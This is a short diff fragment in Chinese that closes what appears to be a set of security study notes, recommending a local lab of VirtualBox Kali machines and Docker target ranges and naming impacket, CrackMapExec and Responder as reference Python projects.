+  本地搭环境: VirtualBox Kalix2, Docker靶场
+  参考项目: impacket, CrackMapExec, Responder (优秀的Python安全项目)
+
+================================================================================
+                        文档结束
+================================================================================
